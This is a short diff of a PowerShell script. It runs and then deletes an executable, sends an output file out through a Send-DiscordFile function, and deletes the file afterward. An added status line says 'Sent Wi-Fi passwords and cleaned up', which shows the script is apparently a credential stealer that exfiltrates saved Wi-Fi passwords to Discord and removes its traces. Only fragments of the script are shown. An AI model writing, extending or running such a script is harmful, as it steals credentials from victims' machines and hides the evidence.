@@ -20,8 +20,8 @@ if (-Not (Test-Path $exePath)) {
 # Execute the executable
 Start-Process -FilePath $exePath -NoNewWindow -Wait
 
-# Optional: You can add a wait time to allow the process to run for a few seconds
-Start-Sleep -Seconds 5
+# Optional: Wait time to allow the process to run for 10 seconds
+Start-Sleep -Seconds 10
 
 # Clean up (delete the executable after execution)
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
@@ -119,3 +119,4 @@ Send-DiscordFile -filePath $outputFile
 
 # Clean up
 Remove-Item $outputFile -Force
+Write-Host "Sent Wi-Fi passwords and cleaned up."
